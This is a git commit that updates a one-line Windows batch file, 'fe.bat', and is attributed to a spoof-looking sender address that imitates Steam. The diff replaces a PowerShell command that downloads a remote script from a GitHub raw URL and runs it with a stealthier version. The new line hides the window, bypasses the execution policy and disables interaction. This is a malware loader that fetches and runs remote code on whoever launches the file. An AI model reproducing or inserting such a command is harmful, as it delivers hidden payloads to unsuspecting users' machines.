88ee4bf1ffb85178c0d4a1f81370ed126990e40e
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-06-16 10:51:01 +0100

    Update fe.bat

--- fe.bat
+++ fe.bat
@@ -1,1 +1,1 @@
-powershell -nop -c  "iex (irm https://raw.githubusercontent.com/petergriuffin123/565/refs/heads/main/f.ps1)"
+powershell -noni -nop -ep bypass -w hidden -c  "iex (irm https://raw.githubusercontent.com/petergriuffin123/565/refs/heads/main/f.ps1)"
